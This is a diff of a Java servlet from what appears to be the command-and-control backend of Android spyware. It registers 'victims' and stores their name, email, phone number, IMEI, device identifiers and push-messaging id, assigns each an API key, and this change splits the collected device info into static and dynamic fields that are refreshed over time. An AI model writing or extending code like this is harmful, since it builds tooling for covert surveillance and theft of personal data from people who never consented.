@@ -42,7 +42,8 @@ public class INServlet extends AdvancedBaseServlet {
                 Victims.COLUMN_IMEI,
                 Victims.COLUMN_DEVICE_NAME,
                 Victims.COLUMN_DEVICE_HASH,
-                Victims.COLUMN_OTHER_DEVICE_INFO
+                Victims.COLUMN_DEVICE_INFO_STATIC,
+                Victims.COLUMN_DEVICE_INFO_DYNAMIC
         };
     }
 
@@ -52,7 +53,8 @@ public class INServlet extends AdvancedBaseServlet {
         final String imei = getStringParameter(Victims.COLUMN_IMEI);
         final String deviceName = getStringParameter(Victims.COLUMN_DEVICE_NAME);
         final String deviceHash = getStringParameter(Victims.COLUMN_DEVICE_HASH);
-        final String otherDeviceInfo = getStringParameter(Victims.COLUMN_OTHER_DEVICE_INFO);
+        final String deviceInfoStatic = getStringParameter(Victims.COLUMN_DEVICE_INFO_STATIC);
+        final String deviceInfoDynamic = getStringParameter(Victims.COLUMN_DEVICE_INFO_DYNAMIC);
 
         final Victims victimsTable = Victims.getInstance();
         final Victim oldVictim = victimsTable.get(Victims.COLUMN_DEVICE_HASH, deviceHash);
@@ -76,7 +78,7 @@ public class INServlet extends AdvancedBaseServlet {
             //Preparing new api key for new victim
             apiKey = RandomString.getNewApiKey(API_KEY_LENGTH);
 
-            final Victim newVictim = new Victim(null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, otherDeviceInfo, null, null, true,
+            final Victim newVictim = new Victim(null, name, email, phone, imei, deviceHash, apiKey, fcmId, deviceName, deviceInfoStatic, deviceInfoDynamic, null, null, true,
                     RandomString.getRandomString(Victim.VICTIM_CODE_LENGTH)
             );
 
@@ -101,6 +103,10 @@ public class INServlet extends AdvancedBaseServlet {
 
             if (isUpdateFeasible(oldVictim.getPhone(), phone)) {
                 victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_PHONE, phone);
+            }
+
+            if (isUpdateFeasible(oldVictim.getDeviceInfoDynamic(), deviceInfoDynamic)) {
+                victimsTable.update(Victims.COLUMN_ID, oldVictim.getId(), Victims.COLUMN_DEVICE_INFO_DYNAMIC, deviceInfoDynamic);
             }
 
 
